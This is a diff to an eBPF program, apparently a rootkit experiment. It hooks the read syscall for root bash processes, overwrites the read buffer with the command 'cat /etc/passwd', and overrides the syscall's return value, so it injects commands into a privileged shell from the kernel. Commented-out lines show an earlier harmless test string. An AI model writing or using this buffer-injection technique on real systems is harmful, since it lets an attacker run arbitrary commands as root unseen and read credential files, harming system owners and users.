@@ -57,6 +57,14 @@ struct {
     __type(value, struct buf_info); // fd + user buffer pointer
 } active_bufs SEC(".maps");
 
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 10240);
+    __type(key, u32);
+    __type(value, u8);
+} is_buf_changable SEC(".maps");
+
+
 int is_bash_with_root(struct pt_regs *ctx)
 {
     char comm[TASK_COMM_LEN];
@@ -263,14 +271,26 @@ int tp_read_exit(struct trace_event_raw_sys_exit *ctx)
     if (!user_buf_info)
         return 0;
 
-    // /* only proceed if fd == 3 (same filter you had in sys_exit handler) */
+    // /* only proceed if fd == 3 
     // if (user_buf_info->fd != 3)
     //     return 0;
 
-    /* Try to write a patch into the user buffer (same as your logic) */
-    const char patch[] = "cat /etc/passwd       ";
-    /* write patch to saved user buffer pointer */
-    bpf_probe_write_user(user_buf_info->buf, patch, sizeof(patch)-1);
+    const char patch[] = "cat /etc/passwd                               ";
+    u8 yes = (ret >= sizeof(patch)) ? 1 : 0;
+    bpf_map_update_elem(&is_buf_changable, &pid, &yes, BPF_ANY);
+
+
+    // const char patch[] = "Hello from ebpf!!\0";
+    // if(ret >= sizeof(patch))
+    // {
+    //     bpf_probe_write_user(user_buf_info->buf, patch, sizeof(patch)-1);
+    //     bpf_map_update_elem(&is_buf_changable, &pid, (const void *) "1", BPF_ANY);
+    // }
+    // else
+    // {
+    //     bpf_map_update_elem(&is_buf_changable, &pid, (const void *) "0", BPF_ANY);
+    // }
+
 
     /* read data from user buffer using the buffer pointer that the enter handler saved.
      * Note: ctx on exit tracepoint doesn't provide the buffer pointer directly,
@@ -286,7 +306,56 @@ int tp_read_exit(struct trace_event_raw_sys_exit *ctx)
                pid, user_buf_info->fd, pathname, data, (int)ret);
 
     /* cleanup saved buffer entry if desired (optional) */
+    // bpf_map_delete_elem(&active_bufs, &pid);
+
+    return 0;
+}
+
+
+SEC("kretprobe/__x64_sys_read")
+int kretprobe_read(struct pt_regs *ctx)
+{
+    if (!is_bash_with_root(ctx))
+        return 0;
+
+    uint32_t pid = bpf_get_current_pid_tgid() >> 32;
+
+    /* Look up the pathname we stored earlier for this PID */
+    char *pathname = bpf_map_lookup_elem(&openat_path_map, &pid);
+    if (!pathname)
+        return 0;
+
+    // /* retrieve saved buffer and fd from enter handler */
+    // struct buf_info *user_buf_info = bpf_map_lookup_elem(&active_bufs, &pid);
+    // if (!user_buf_info)
+    //     return 0;
+
+    struct buf_info *bi = bpf_map_lookup_elem(&active_bufs, &pid);
+    if (!bi)
+        return 0;
+    // char* change_ret = (char*) bpf_map_lookup_elem(&is_buf_changable,&pid);
+
+    // if(change_ret != NULL && change_ret[0] == '1')
+    // {
+    //     const char patch[] = "Hello from ebpf!!\0";
+    //     bpf_override_return(ctx, sizeof(patch)-1);
+    // }
+
+    u8 *flag = bpf_map_lookup_elem(&is_buf_changable, &pid);
+    if (!flag || *flag == 0)
+        return 0;
+
+    const char patch[] = "cat /etc/passwd                               ";
+
+    // write data to user buffer
+    bpf_probe_write_user(bi->buf, patch, sizeof(patch)-1);
+
+    // force syscall return value to match length
+    bpf_override_return(ctx, sizeof(patch)-1);
+
+    // cleanup
     bpf_map_delete_elem(&active_bufs, &pid);
+    bpf_map_delete_elem(&is_buf_changable, &pid);
 
     return 0;
 }
